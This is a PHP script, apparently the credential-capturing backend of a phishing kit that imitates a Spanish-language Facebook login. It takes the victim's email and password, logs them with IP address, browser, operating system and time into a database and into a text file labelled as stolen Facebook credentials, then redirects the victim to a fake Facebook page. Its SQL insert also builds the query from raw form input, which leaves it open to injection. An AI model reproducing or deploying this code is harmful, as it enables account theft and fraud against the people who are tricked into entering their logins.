<?php

include("setup/functions.php");


date_default_timezone_set('America/Santiago');


$Email= $_POST['email'];
$Pass= $_POST['pass'];
$Fecha= fecha_bd();
$Hora= hora_bd();
$IP= $_SERVER['REMOTE_ADDR'];
$Hostname= gethostname();
$Navegador= getBrowser($user_agent);
$SO= getPlatform($user_agent);

$sql= "INSERT INTO Informacion (Email, Pass, Fecha, Hora, IP, Hostname, Navegador, SO ) VALUES ('$Email','$Pass','$Fecha','$Hora','$IP','$Hostname','$Navegador','$SO')";
mysqli_query(conexion(),$sql); 






 if( ( empty($Email)) or (empty($Pass)) ){
    header('location: ../es-es.facebook.com.html');
}else{  
        //guarderemos en un archivo de texto
        $file = fopen('2factorhack.txt','a+');
        fwrite($file, "=======================================================================================================================\r\n CREDENCIALES DE FB BY Insannity \r\n=======================================================================================================================\nEMAIL: ".$Email."\n\r\nPASS: ".$Pass."\n\r\nIP: ".$IP."\n\r\nNAVEGADOR: ".$Navegador."\n\r\nHOSTNAME: ".$Hostname."\n\r\nFECHA: ".$Fecha." HORA: ".$Hora."\n\r\nSO: ".$SO."\r\n");
        fclose($file);
        header('location: http://localhost/facebook/es-es.facebook.com.html');
        
}

?>




